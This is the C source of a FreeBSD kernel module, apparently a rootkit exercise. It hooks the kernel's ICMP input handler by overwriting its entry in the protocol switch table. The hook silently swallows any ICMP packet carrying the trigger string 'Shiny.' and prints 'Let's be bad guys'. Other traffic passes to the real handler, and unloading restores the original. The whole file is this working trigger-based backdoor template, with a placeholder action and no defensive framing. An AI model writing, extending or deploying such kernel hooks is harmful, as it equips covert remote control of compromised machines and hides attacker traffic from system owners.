#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>

#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>

#define TRIGGER "Shiny."

extern struct protosw inetsw[];
// typedef int pr_input_t (struct mbuff**, int *, int)
pr_input_t icmp_input_hook;

int
icmp_input_hook(struct mbuf **mp, int *offp, int proto) {
	struct icmp *icp;
	struct mbuf *m = *mp;
	int hlen = *offp;

	/* Locate the ICMP message withint m. */
	m->m_len  -= hlen;
	m->m_data += hlen;

	/** Extract the ICMP message. */
	icp = mtod(m, struct icmp *);

	/** Restore m. */
	m->m_len  += hlen;
	m->m_data -= hlen;

	/** Is this the ICMP message we are looking for? */
	if (strncmp(icp->icmp_data, TRIGGER, 6) == 0) {
		printf("Let's be bad guys\n");
		return 0;
	} else {
		return icmp_input(mp, offp, proto);
	}
}

static int
load(struct module *module, int cmd, void *arg) {
	int error = 0;

	switch(cmd) {
	case MOD_LOAD:
		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
		break;

	case MOD_UNLOAD:
		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
		break;
	
	default:
		error = EOPNOTSUPP;
		break;
	}

	return (error);
}

static moduledata_t icmp_input_hook_mod = {
	"icmp_input_hook",      /** module name */
	load,                   /** event handler */
	NULL                    /** extra data */
};

DECLARE_MODULE(icmp_input_hook, icmp_input_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
